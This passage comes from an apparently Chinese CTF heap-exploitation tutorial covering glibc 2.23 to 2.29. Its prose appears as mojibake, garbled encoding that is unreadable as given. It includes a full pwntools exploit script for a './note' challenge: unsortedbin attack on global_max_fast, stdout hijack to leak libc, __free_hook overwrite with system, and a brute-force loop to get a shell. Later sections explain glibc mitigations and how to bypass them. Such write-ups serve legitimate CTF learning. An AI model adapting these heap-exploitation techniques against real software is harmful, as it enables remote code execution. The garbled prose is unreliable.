+ æ— Leak + Sizeä¸åšé™åˆ¶\n\nâ–²æ— Leaké€šå¸¸éœ€è¦çˆ†ç ´ï¼ŒåŒæ ·ç”¨unsortedbin attackéƒ¨åˆ†å†™unsortedbinä¸­chunkçš„bkæŒ‡é’ˆï¼Œä¿®æ”¹global_max_fastï¼Œä¹‹ååˆ©ç”¨fastbinYæœºåˆ¶åŠ«æŒ_IO_2_1_stdout_ç»“æ„ä½“ï¼Œæ³„éœ²å‡ºåœ°å€ï¼Œç„¶åå°±å’Œä¹‹å‰ä¸€æ ·ï¼Œå†åˆ©ç”¨fastbinYæœºåˆ¶åŠ«æŒfree_hookå³å¯ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\ndef pwn():\n\t#one_gadget = getOnegadget()\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\n\tadd_malloc(0x1000-0x8,'PIG007NB')\n\n\t#prepare data-----------------------------------------------------------\n\tguess_libc = 0x9000\n\tguess_heap = 0x2000\n\tfastbinsY = guess_libc + libc.sym['main_arena'] + 8\n\t_IO_read_end = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x10\n\t_IO_write_base = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x20\n\t_IO_write_ptr = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x28\n\t_IO_write_end = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x30\n\n\tidx_read_end = (_IO_read_end - fastbinsY) / 8\n\tsize_read_end = idx_read_end * 0x10 + 0x20\n\n\tidx_write_base = (_IO_write_base - fastbinsY) / 8\n\tsize_write_base = idx_write_base * 0x10 + 0x20\n\n\tidx_write_ptr = (_IO_write_ptr - fastbinsY) / 8\n\tsize_write_ptr = idx_write_ptr * 0x10 + 0x20\n\n\tidx_write_end = (_IO_write_end - fastbinsY) / 8\n\tsize_write_end = idx_write_end * 0x10 + 0x20\n\n\ttarget_addr_gMF = guess_libc + libc.sym['global_max_fast']\n\n\tfastbinsY = libc.sym['main_arena'] + 8\n\ttarget_addr_binsY = libc.sym['__free_hook']-0x10\n\tidx_free_hook = (target_addr_binsY - fastbinsY) / 8\n\tsize_free_hook = idx_free_hook * 0x10 + 0x20\n\n\t#read_end-------------------------------------------------------------\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x1\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x2  point free  read_end\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0x3\n\tadd_malloc(0x38,'\\x04'*0x18+p64(0x21)+'\\x04'*0x18)\t\t#idx\t0x4\n\n\tfree(0x1)\n\t#free(2)\n\tfree(0x3)\n\tedit(0x3,0x1,'\\x20')\n\tedit(0x1,0x20,p64(0x0)*3+p64(0x41))\n\n\tadd_malloc(0x38,'\\x05'*0x18+p64(0x21)+'\\x05'*0x18)\t\t\t\t#idx\t0x5\n\tadd_malloc(0x38,'\\x06'*0x18)\t\t\t\t\t\t\t\t\t#idx\t0x6 #point change size\n\t#---------------------------------------------------------------------\n\n\n\t#write_end can not be so far from wirte_base\n\tadd_malloc(size_write_end-0x8,(p64(0x0)+p64(0x21))*((size_write_end-0x10)/0x10))\t\t\t\t#idx\t0x7\n\tadd_malloc(size_write_ptr-0x8,(p64(0x0)+p64(0x21))*((size_write_ptr-0x10)/0x10))\t\t\t\t#idx\t0x8\n\n\n\t#write_base-----------------------------------------------------------\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x9\n\tadd_malloc(0x38,\"\\xaa\"*0x38)\t\t\t\t#idx\t0xa\n\tadd_malloc(0x38,\"\\x0b\"*0x38)\t\t\t\t#idx\t0xb\n\tadd_malloc(0x38,'\\x0c'*0x18+p64(0x21)+'\\xaa'*0x18)\t\t#idx\t0xc\n\n\tfree(0x9)\n\t#free(2)\n\tfree(0xb)\n\tedit(0xb,0x2,p16((guess_heap+0x1000+0x40)&0xffff))\n\tedit(0x9,0x20,p64(0x0)*3+p64(0x41))\n\n\tadd_malloc(0x38,'\\x0d'*0x18+p64(0x21)+'\\x05'*0x18)\t\t\t\t#idx\t0xd\n\tadd_malloc(0x38,'\\x0e'*0x18)\t\t\t\t\t\t\t\t\t#idx\t0xe #point free\n\t#---------------------------------------------------------------------\n\n\n\n\t#prepare for free_hook\n\tadd_malloc(size_free_hook-0x8,'PIG007NB')\t\t\t#idxf\n\tadd_malloc(size_free_hook+0x10-0x8,'PIG007NB')\t\t#idx10\n\n\n\t#unsortedbin attack\n\tadd_malloc(0x4f8,'\\x11'*0x4f8)\t\t\t#idx 0x11\n\tadd_malloc(0x38,'\\x12'*0x38)\t\t\t#idx 0x12\n\tfree(0x11)\n\tedit(0x11,0x8+0x2,p64(0x0)+p16((target_addr_gMF&0xffff)-0x10))\n\tadd_malloc(0x4f8,'/bin/sh\\x00')\t\t\t#idx 0x13\n\n\n\n\t#change write_base \n\tedit_m(0x6,0x20,p64(0x0)*3+p64(size_write_base+1))\n\tfree_m(0xe)\n\n\n\t#change write_end and write_ptr\n\tfree_m(0x7)\n\tfree_m(0x8)\n\n\n\t#change read_end\n\tedit_m(0x6,0x20,p64(0x0)*3+p64(size_read_end+1))\n\tfree_m(0x2)\n\n\tlibc_base = u64Leakbase(libc.sym['_IO_2_1_stdout_']+131)\n\tlg(\"libc_base\",libc_base)\n\n\t#write free_hook - 0x10\n\tfree(0xf)\n\n\t#left size\n\tedit(0xf,0x8,p64(size_free_hook+0x10+1))\n\tadd_malloc(size_free_hook-0x8,'PIG007NB')\n\n\t#get free_hook - 0x8\n\tfree(0x10)\n\tedit(0x10,0x8,p64(libc_base + target_addr_binsY -0x8))\n\tadd_malloc(size_free_hook+0x10-0x8,'PIG007NB')\n\tadd_malloc(size_free_hook+0x10-0x8,p64(0x0)+p64(libc_base + libc.sym['system']))\n\n\t#get shell\n\tfree(0x13)\n\tit()\n\n\n\n\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\nâ–²é€šå¸¸éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œwrite_baseå’Œwrite_endä¸èƒ½ç›¸è·å¤ªè¿œï¼Œä¸ç„¶å¾ˆå®¹æ˜“æ•°æ®é‡è¿‡å¤§è€Œå´©æºƒã€‚è¿˜æœ‰è¿™é‡Œæœ€åæ³„éœ²åœ°å€æ˜¯\n\nlibc_base = u64Leakbase(libc.sym['_IO_2_1_stdout_']+131)\n\nè¿™æ˜¯å› ä¸ºIOæµçš„æœºåˆ¶ï¼Œä¼šåœ¨å†™å…¥æ•°æ®çš„0x10å¤„ä¸Šå†™ä¸‹libc.sym['_IO_2_1_stdout_']+131çš„åœ°å€ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥å°±èƒ½æ³„éœ²ã€‚\n\nâ–²é¢˜å¤–è¯ï¼šçˆ†ç ´çš„æ•°å­¦æœŸæœ›ä¸º1/256\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-17_18-07-31.png)\n\n## 4.UAF + æ— Leak + Sizeåšé™åˆ¶\n\nâ–²åŒæ ·sizeåšé™åˆ¶ä¸€èˆ¬ä¹Ÿåˆ†ä¸ºä»¥ä¸‹å‡ ç§\n\n(1)åªèƒ½æ˜¯å°Chunkï¼Œå³0x20~0x80ï¼š\n\nè¿™ä¸ªä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œåˆ©ç”¨UAFéƒ¨åˆ†å†™å…¥heap_addråˆ¶é€ å †å—é‡å ï¼Œä¿®æ”¹sizeåŸŸï¼Œæ”¾å…¥unsortedbinï¼Œç„¶åéƒ¨åˆ†å†™å…¥libc_addræ‰“unsortedbin attackä¿®æ”¹global_max_fastï¼Œä¹‹åå°±ç±»ä¼¼äº†ï¼ŒåŠ«æŒ_IO_2_1_stdoutæ³„éœ²åœ°å€ï¼ŒfastbinYæœºåˆ¶åŠ«æŒmain_arenaï¼Œä¿®å¤unsortedbinåæ”¹top_chunkåŠ«æŒmalloc_hookå³å¯ã€‚\n\n(2)åªèƒ½æ˜¯ä¸­ç­‰çš„chunkï¼Œå¤§äºfatsbinå°äºlargebinçš„ï¼Œå³0x90~0x3f0ã€‚\n\nç±»ä¼¼ï¼Œéƒ¨åˆ†å†™ä¿®æ”¹sizeåŸŸæ‰“unsortedbin attackï¼Œä¿®æ”¹global_max_fastï¼ŒåŠ«æŒ_IO_2_1_stdoutæ³„éœ²åœ°å€ã€‚fastbinYæœºåˆ¶åŠ«æŒfree_hookã€‚\n\n(3)åªèƒ½æ˜¯å¤§chunkï¼Œå³0x400~...\n\nç›´æ¥ç”¨éƒ¨åˆ†å†™libc_addræ‰“unsortedbin attackï¼Œä¿®æ”¹global_max_fastï¼ŒåŠ«æŒ_IO_2_1_stdoutæ³„éœ²åœ°å€ï¼Œä¹‹ååˆ©ç”¨fastbinYæœºåˆ¶å¯åœ¨free_hooké™„è¿‘ä¼ªé€ å †sizeï¼Œç„¶åç”³è¯·è¿‡å»ä¿®æ”¹free_hookä¸ºsystemï¼Œé‡Šæ”¾å †å—å³å¯ã€‚\n\n(4)æŒ‡å®šçš„chunk sizeã€‚\n\nâ–²å…¶å®å¯¹äºUAFæ¥è¯´ï¼Œsizeåšæ²¡åšé™åˆ¶éƒ½å·®ä¸äº†å¤ªå¤šï¼Œå› ä¸ºéƒ½å¯ä»¥éƒ¨åˆ†å†™å †å—åœ°å€åˆ¶é€ å †é‡å ï¼Œç„¶åå°±èƒ½ä¿®æ”¹sizeåŸŸï¼Œå”¯ä¸€åŒºåˆ†çš„å°±æ˜¯ç”³è¯·æ—¶å€™çš„é™åˆ¶ï¼Œå°çš„å°±æ‰“top_chunkï¼Œå¤§çš„å°±ç›´æ¥æ‰“_free_hookã€‚æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€ç‚¹å°±æ˜¯é™åˆ¶ç‰¹å®šsizeï¼Œä¸€èˆ¬é™åˆ¶ä¸ºä¸¤ä¸ªï¼Œä»¥å‰é‡åˆ°0x20å’Œ0x30ï¼Œä¹Ÿæœ‰0x40å’Œ0x50çš„ï¼Œéƒ½æ˜¯å¤§åŒå°å¼‚ï¼Œå€Ÿç”¨fastbinYæœºåˆ¶ç•™ä¸‹sizeåç”³è¯·è¿‡å»å³å¯ã€‚\n\n \n\n# å››ã€Glibc2.27\n\nUAFåœ¨è¿™ä¸ªç‰ˆæœ¬ä¸‹å¯¹äºtcacheå®åœ¨æ˜¯å¥½ç”¨ï¼Œç”±äºtcacheä¸æ£€æŸ¥sizeä½ï¼Œä¹Ÿä¸æ£€æŸ¥FDï¼Œåªè¦æ³„éœ²äº†åœ°å€ï¼ŒåŠ ä¸ŠUAFå°±èƒ½å®ç°ä»»æ„ç”³è¯·ã€‚è€Œå¯¹äºæ— showåŠŸèƒ½çš„ï¼Œæ—¢å¯ä»¥å€ŸåŠ©unsortedbinè¸©ä¸‹åœ°å€åçˆ†ç ´ç›´æ¥ç”³è¯·ï¼Œä¹Ÿå¯ä»¥unsortedbin attackåŠ«æŒglobal_fast_maxä¹‹åå†åŠ«æŒIO_2_1_stdoutç»“æ„æ³„éœ²åœ°å€ã€‚\n\n## 1.Sashingæœºåˆ¶å¸¦æ¥çš„æ”¹å˜\n\n### (1)åŠ å…¥çš„æ£€æŸ¥åˆ¤æ–­ï¼š\n\néœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œç”±äºåŠ å…¥äº†tcacheçš„stahingæœºåˆ¶ï¼Œæ‰€ä»¥åœ¨ä»fastbinä¸­ç”³è¯·æ—¶ä¼šæœ‰ä¸€ä¸ªåˆ¤æ–­ï¼š\n\nï¼ˆ**è¿™ä¸ªåœ¨2.26å¼€å§‹å°±å­˜åœ¨çš„ï¼Œåªä¸è¿‡å¯èƒ½ä»£ç ä¸å¤ªä¸€æ ·ï¼Œæ‰€ä»¥æœ‰tcacheçš„åœ°æ–¹ï¼Œfastbinä¿®æ”¹fdä»è€Œåœ¨main_arenaä¸Šç•™ä¸‹fdçš„åŠŸèƒ½å°±æ— æ³•ä½¿ç”¨äº†ï¼‰**\n\n![Snipaste_2021-08-19_21-32-57](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108192133799.png)\n\n ç”±äºtcacheçš„stashingæœºåˆ¶ï¼Œå¦‚æœä»fastbinä¸­å–chunkï¼Œé‚£ä¹ˆå¦‚æœè¯¥å¤§å°çš„fastbiné“¾ä¸­è¿˜æœ‰å…¶ä»–chunkï¼Œåˆ™ä¼šå°è¯•å°†è¯¥å¤§å°çš„fastbiné“¾ä¸­å‰©ä½™çš„chunkéƒ½æ”¾å…¥å¯¹åº”å¤§å°çš„tcacheä¸­ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°å¦‚ä¸Šçš„å¯¹fastbinä¸­çš„fdè¿›è¡Œå–å‡ºæ£€æŸ¥ï¼Œè¿™é‡Œæˆ‘è®¾ç½®äº†fastbinä¸­Chunkçš„fdä¸º0x71ï¼Œå³rdxçš„å€¼ï¼Œå¯¼è‡´å‡ºé”™ã€‚\n\n```c\n//æ³¨é‡Šå¤´\n\n*fb = tc_victim->fd;\n\nmov    rax, qword ptr [rdx + 0x10]\n```\n\nè¿™ä¸ªä»£ç ä»¥åŠæ±‡ç¼–èµ‹å€¼ï¼Œä½¿å¾—[rdx+0x10]ï¼Œå³å–0x71çš„fdæŒ‡é’ˆï¼Œé‚£è‚¯å®šä¼šå‡ºé”™ã€‚åŒæ ·çš„ï¼Œå¦‚æœä¿®æ”¹fastbinä¸­chunkçš„fdä¹Ÿä¸å†æ˜¯ç®€å•åœ°ä¼ªé€ sizeäº†ï¼Œè¿˜éœ€è¦è€ƒè™‘å¯¹åº”FDçš„fdæŒ‡é’ˆæœ‰æ•ˆæ€§ã€‚\n\n### (2)å¯¹æŠ—åˆ©ç”¨ï¼š\n\n#### â‘ have_fastchunks:\n\nè™½ç„¶FDä¸èƒ½ç•™ä¸‹ä¼ªé€ åœ°å€ï¼Œä½†æ˜¯å¯ä»¥é‡Šæ”¾ä¸€ä¸ªchunkè¿›å…¥fastbinï¼Œå°†main_arena.have_fastchunksç½®1ï¼Œä¹‹ååˆ©ç”¨main_arena.have_fastchunksç•™ä¸‹çš„0x1åœ¨ä¸Šé¢æ¥ç”³è¯·0x100çš„å­—èŠ‚é”™ä½ï¼Œä½†æ˜¯è¿™ä¸ªéœ€è¦å…ˆä¿®æ”¹global_max_fastæ‰èƒ½ç”³è¯·0x100çš„fastbinChunkã€‚\n\n![Snipaste_2021-08-27_14-48-12](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827144821.png)\n\n#### â‘£top_chunk:\n\næ­¤å¤–ï¼Œå€Ÿç”¨çˆ†ç ´chunkåœ°å€ï¼Œå°†top_chunkçš„0x56å½“ä½œåˆæ³•sizeä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\n\n![Snipaste_2021-08-27_14-42-24](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827144239.png)\n\nä½†æ˜¯å…¶å®ä¹Ÿæ²¡å·®ï¼Œæ—¢ç„¶æœ‰tcacheï¼Œé‚£æˆ‘è¿˜ç”¨fastbinç”³è¯·å¹²å•¥ï¼Œç›´æ¥tcacheè·å¾—åœ°å€ä¹‹åä»»æ„ç”³è¯·ä¸å°±å®Œäº†ï¼Œé™¤éå…¨æ˜¯callocï¼Œä½†è¿™ç§æƒ…å†µå…¶å®è¿˜æœ‰æ›´æ–¹ä¾¿çš„è§£æ³•ï¼Œå³`house of banana`ã€‚æ‰€ä»¥è¦æ˜¯ç¢°åˆ°2.27ç‰ˆæœ¬çš„ï¼Œç®€ç›´å°±æ˜¯çƒ§é«˜é¦™äº†ã€‚\n\n## 2.Glibc2.27Tcacheé¢˜å¤–è¯ï¼š\n\nç°ä»Šç‰ˆæœ¬ï¼Œ2020å¹´09æœˆ10æ—¥å¼€å§‹ï¼Œä»2.27-3ubuntu1.3å¼€å§‹ï¼Œå°±å·²ç»å¯¹tcacheåšäº†éƒ¨åˆ†ä¿®æ”¹ï¼Œå¾ˆæ¥è¿‘2.29çš„ï¼Œè€Œç°åœ¨çš„é¢˜ç›®åŸºæœ¬éƒ½æ˜¯åŸºäºè¿™ç§å¢å¼ºå‹ç‰ˆæœ¬çš„ï¼Œå·²ç»ä¸å­˜åœ¨double freeäº†ã€‚\n\n[Glibc 2.27å…³äºTcacheçš„å¢å¼ºä¿æŠ¤ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/219292#h2-2)\n\næ–°å¢å¦‚ä¸‹ï¼š\n\n### (1)Keyå­—æ®µæ–°å¢ï¼š\n\n```c\n/* We overlay this structure on the user-data portion of a chunk when\n   the chunk is stored in the per-thread cache.  */\ntypedef struct tcache_entry\n{\n    struct tcache_entry *next;\n    /* This field exists to detect double frees.  */\n    struct tcache_perthread_struct *key;\n} tcache_entry;\n```\n\nåŒæ ·çš„å¯¹åº”tcache_putä¼šåŠ å…¥keyå­—æ®µï¼Œtcache_getä¸­ä¼šæ¸…é™¤keyå­—æ®µï¼Œ_int_freeå‡½æ•°ä¼š**æ ¹æ®keyå­—æ®µ**åˆ¤æ–­double freeã€‚\n\nè¿™é‡Œè®²ä¸ªå°æŠ€å·§ï¼Œå¦‚æœå‘ç°é¢˜ç›®çš„libc.soç‰ˆæœ¬åœ¨2.27-3ubuntu1.3ä¹‹ä¸‹ï¼Œé‚£ä¹ˆå°±æ²¡æœ‰keyå­—æ®µï¼Œå­˜åœ¨æ— é™åˆ¶çš„double freeï¼Œç›´æ¥æå®šã€‚è€Œå¸¸è§„çš„2.28ç‰ˆæœ¬å…¶å®ä¹Ÿè¿˜å­˜åœ¨double freeï¼ŒæŸ¥çœ‹_int_freeç›¸å…³æºç å³å¯å‘ç°ã€‚\n\nå…·ä½“åˆ©ç”¨å’Œç»•è¿‡åé¢è®²ã€‚\n\n### (2)Tcacheæ•°é‡é™åˆ¶\n\n```c\n#define MAX_TCACHE_COUNT 127    /* Maximum value of counts[] entries.  */\n```\n\nè¿™ä¸ªæ²¡å‘ç°æœ‰å•¥ç”¨ï¼Œä¼ ç»Ÿçš„åªæœ‰2.30å¼€å§‹æ‰ç”¨åˆ°äº†è¿™ä¸ªï¼Œä½ç‰ˆæœ¬è¿å®šä¹‰éƒ½æ²¡æœ‰ï¼Œé™¤äº†è¿™ä¸ªå¢å¼ºå‹çš„2.27\n\n```c\n//2.30\n\ndo_set_tcache_count (size_t value)\n{\n    if (value <= MAX_TCACHE_COUNT)\n    {\n        LIBC_PROBE (memory_tunable_tcache_count, 2, value, mp_.tcache_count);\n        mp_.tcache_count = value;\n    }\n    return 1;\n}\n```\n\nè¿™å°±å¾ˆè¿·æƒ‘ï¼Œé€šå¸¸å®šä¹‰çš„tcache_countæ˜¯7ï¼Œè€Œè¿™é‡Œå´è¦æ±‚å°äºMAX_TCACHE_COUNT(127)ï¼Œæ˜¯å› ä¸ºGNUçš„å…¶ä»–åŠŸèƒ½å¯èƒ½ä¼šæ”¹å˜tcacheçš„ç»“æ„å—ï¼Œæ¯”å¦‚å°†tcache_countä¿®æ”¹ä¸º127ï¼Œæ‰©å¤§tcacheæ¥ä½¿ç”¨å—ï¼Œç­‰å¾…å¤§ä½¬å‘ç°æ¼æ´ã€‚\n\nå¦å¤–è¯¥æ–‡ç« ä¸­è¿˜è¯´äº†reallocå¯¹åº”memcpyçš„ä½¿ç”¨ä¿®æ”¹ï¼Œæ„Ÿè§‰æ²¡å•¥ç”¨ã€‚\n\næ€»çš„æ¥è¯´ï¼Œå…¶å®å°±ç›¸å½“äºå°†2.27çš„tcacheå¢å¼ºæˆäº†2.29ï¼Œå…¶ä»–çš„åˆ°æ²¡å•¥å˜åŒ–ã€‚\n\n\n\n# äº”ã€Glibc2.29\n\n## 1.éƒ¨åˆ†æ‰‹æ®µå¤±æ•ˆ\n\n### (1)unsortedbin attackå¤±æ•ˆ\n\nè¿™ä¸ªç‰ˆæœ¬ä¸‹çš„unsortedbin attckå·²ç»å¤±æ•ˆï¼ŒåŸå› æ˜¯æ–°å¢å¦‚ä¸‹æ£€æŸ¥ï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nmchunkptr next = chunk_at_offset (victim, size);\nif (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)\n    || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))\n    malloc_printerr (\"malloc(): invalid next size (unsorted)\");\nif (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))\n    malloc_printerr (\"malloc(): mismatching next->prev_size (unsorted)\");\nif (__glibc_unlikely (bck->fd != victim)\n    || __glibc_unlikely (victim->fd != unsorted_chunks (av)))\n    malloc_printerr (\"malloc(): unsorted double linked list corrupted\");\nif (__glibc_unlikely (prev_inuse (next)))\n    malloc_printerr (\"malloc(): invalid next->prev_inuse (unsorted)\");\n```\n\nâ‘ ä¸‹ä¸€ä¸ªchunkçš„sizeæ˜¯å¦åœ¨åˆç†åŒºé—´\n\nâ‘¡ä¸‹ä¸€ä¸ªchunkçš„prevsizeæ˜¯å¦ç­‰äºvictimçš„size\n\nâ‘¢æ£€æŸ¥unsortedbinåŒå‘é“¾è¡¨çš„å®Œæ•´æ€§\n\nâ‘£ä¸‹ä¸€ä¸ªchunkçš„previnuseæ ‡å¿—ä½æ˜¯å¦ä¸º0\n\nå…¶å®æœ€è¦å‘½çš„æ˜¯æ£€æŸ¥åŒå‘é“¾è¡¨çš„å®Œæ•´æ€§ï¼Œè¿˜å¾—åœ¨ç›®çš„åœ°å€çš„fdä¼ªé€ victimï¼Œéƒ½èƒ½ä¼ªé€ åœ°å€äº†è¿˜ç”¨è¿™ï¼Œæ‰€ä»¥ç›´æ¥åºŸå¼ƒã€‚Tcache_Stashing_Unlink_Attackæ¥ç±»ä¼¼ä»£æ›¿unsortedbin attackï¼Œä¸è¿‡Tcache_Stashing_Unlink_Attackä¸€èˆ¬éœ€è¦ç”¨åˆ°callocï¼Œå¦‚æœæœ‰UAFæ³„éœ²åœ°å€çš„è¯å€’æ˜¯ä¸å¤ªéœ€è¦ã€‚\n\n### (2)top_chunkæ”¹å†™é™åˆ¶\n\næ–°å¢æ£€æŸ¥ï¼š\n\n```C\n#æ³¨é‡Šå¤´\n\nif (__glibc_unlikely (size > av->system_mem))  //0x21000        \n    malloc_printerr (\"malloc(): corrupted top size\");\n```\n\nå³sizeéœ€è¦å°äºç­‰äºsystem_mems = 0x21000ã€‚ä¹‹å‰ç”±top_chunkå¼•å‘çš„ä¸€ç³»åˆ—æ¼æ´ï¼Œç±»ä¼¼House of orange,\n\nHouse of Forceä»¥åŠä¹‹å‰æåˆ°çš„ä¿®æ”¹top_chunkåˆ°malloc_hooké™„è¿‘ç­‰ï¼Œéƒ½ä¸å¤ªè¡Œäº†ã€‚\n\n### (3)unlinkæ–¹é¢ä¸€äº›é™åˆ¶\n\næ–°å¢æ£€æŸ¥ï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nif(__glibc_unlikely (chunksize(p) != prevsize))\t*//new*        \n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\nå³ä¼šåˆ¤æ–­æ‰¾åˆ°çš„ä¹‹å‰ä¸ºFreeçŠ¶æ€çš„chunkå’Œå½“å‰è¦é‡Šæ”¾chunkçš„prevsizeæ˜¯å¦ç›¸ç­‰\n\nè¿™ä¸ªå¯¹äºUAFæ–¹é¢æ¥è¯´æ²¡å•¥å½±å“ï¼Œå› ä¸ºUAFæœ¬èº«å°±åŸºæœ¬ç›´æ¥é€ æˆå †å—é‡å ï¼Œè€Œunlinké€šå¸¸å°±æ˜¯ç»“åˆoff-by-nullæ¥åˆ¶é€ å †å—é‡å çš„ã€‚off-by-nullå’Œoff-by-oneä¹‹åå¼€ä¸€ä¸ªä¸“é—¨çš„æ¥è®¨è®ºã€‚\n\n### (4)tcacheæ–¹é¢çš„å˜åŒ–\n\n#### â‘ æ–°å¢keyå­—æ®µ\n\n```c\n#æ³¨é‡Šå¤´\n\ntypedef struct tcache_entry\n{\n    struct tcache_entry *next;\n    /* This field exists to detect double frees.  */\n    struct tcache_perthread_struct *key;\n} tcache_entry;\n\n//-------------------------------------------------------------------------------\n\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n    assert (tc_idx < TCACHE_MAX_BINS);\n\n    /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n    e->key = tcache;\t//add\n\n    e->next = tcache->entries[tc_idx];\n    tcache->entries[tc_idx] = e;\n    ++(tcache->counts[tc_idx]);\n}\n\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    assert (tc_idx < TCACHE_MAX_BINS);\n    assert (tcache->entries[tc_idx] > 0);\n    tcache->entries[tc_idx] = e->next;\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\t//add\n    return (void *) e;\n}\n\n\n```\n\nå³ä¼šåœ¨é‡Šæ”¾chunkçš„bkå¤„åŠ å…¥keyå­—æ®µï¼Œä¸€èˆ¬ä¸ºheap_base+0x10ï¼Œå³å½“å‰çº¿ç¨‹çš„tcache structçš„åœ°æ–¹ã€‚é‡Šæ”¾æ—¶èµ‹å€¼ï¼Œç”³è¯·å›æ¥æ—¶ç½®é›¶ã€‚\n\n#### â‘¡æ–°å¢çš„ä¸€äº›æ£€æŸ¥\n\n```c\n//æ³¨é‡Šå¤´\n\n{\n    size_t tc_idx = csize2tidx (size);\n    if (tcache != NULL && tc_idx < mp_.tcache_bins)\n    {\n        /* Check to see if it's already in the tcache.  */\n        tcache_entry *e = (tcache_entry *) chunk2mem (p);\n\n        /* This test succeeds on double free.  However, we don't 100%\n   trust it (it also matches random payload data at a 1 in\n   2^<size_t> chance), so verify it's not an unlikely\n   coincidence before aborting.  */\n        if (__glibc_unlikely (e->key == tcache))\n        {\n            tcache_entry *tmp;\n            LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);\n            for (tmp = tcache->entries[tc_idx];\n                 tmp;\n                 tmp = tmp->next)\n                if (tmp == e)\n                    malloc_printerr (\"free(): double free detected in tcache 2\");\n            /* If we get here, it was a coincidence.  We've wasted a\n       few cycles, but don't abort.  */\n        }\n\n        if (tcache->counts[tc_idx] < mp_.tcache_count)\n        {\n            tcache_put (p, tc_idx);\n            return;\n        }\n    }\n}\n```\né‡ç‚¹æ˜¯è¿™é‡Œ**if (__glibc_unlikely (e->key == tcache))**ï¼Œå³é’ˆå¯¹ä¹‹å‰tcache dupåšçš„é™åˆ¶ï¼Œæ£€æŸ¥è¦é‡Šæ”¾chunkçš„keyå­—æ®µï¼Œå¦‚æœç­‰äºtcacheç»“æ„ä½“åœ°å€ï¼Œåˆ™éå†å¯¹äºçš„tcacheä¸­çš„chunkæ˜¯å¦å’Œè¯¥chunkä¸ºåŒä¸€ä¸ªchunkï¼Œæ˜¯åˆ™æŠ¥é”™ã€‚è¿™ä¸ªå¥½ç»•è¿‡ï¼Œé€šå¸¸å¯ä»¥åˆ©ç”¨æ¼æ´æ”¹æ‰tcacheä¸­å¯¹äºchunkçš„bkæŒ‡é’ˆå³å¯ã€‚ç”±äºunsortedbin attackå¤±æ•ˆï¼Œè€ŒTcache_Stashing_Unlink_Attacké€šå¸¸è¿˜éœ€è¦ç»“åˆå †æº¢å‡ºï¼ŒUAFä¹‹ç±»çš„æ¼æ´ï¼Œæ‰€ä»¥å¸¸å¸¸å¯ä»¥**é…åˆlargebin attackæ¥è¿›è¡Œæ”»å‡»tcache dupã€‚**\n\nâ–²è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰çš„2.27ç‰ˆæœ¬å·²ç»å¼•å…¥äº†2.29ä¸­çš„ä¸€äº›æœºåˆ¶ï¼Œåˆšåˆšæåˆ°çš„ï¼Œæ¯”å¦‚keyå­—æ®µä¹‹ç±»çš„ï¼Œå…·ä½“åšé¢˜å…·ä½“åˆ†æã€‚\n\nå‚è€ƒï¼š[glibc-2.29æ–°å¢çš„ä¿æŠ¤æœºåˆ¶å­¦ä¹ æ€»ç»“ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/194960#h2-1)\n\n#### â‘¢å‡ºç°çš„æ–°æ‰‹æ®µ\n\nTcache stash unlink attackï¼Œå¾ˆå¤šå¸ˆå‚…åˆ†æè¿™ä¸ªæ¼æ´éƒ½æ˜¯åœ¨2.29ä¸‹å¼€å§‹åˆ†æï¼Œä½†å®é™…ä¸Šä»æœ€å¼€å§‹å¼•å…¥2.26çš„tcacheå°±å·²ç»æœ‰äº†ï¼Œåªä¸è¿‡å¯èƒ½æ˜¯ä¹‹å‰çš„unsortedbin attackå¤ªå¥½ç”¨ï¼Œå°±æ²¡å¼€å‘å‡ºæ¥è¿™ä¸ªæ¼æ´ã€‚\n\n```c\n//2.26  \n\nif (in_smallbin_range (nb))\n{\n    idx = smallbin_index (nb);\n    bin = bin_at (av, idx);\n\n    if ((victim = last (bin)) != bin)\n    {\n        if (victim == 0) /* initialization check 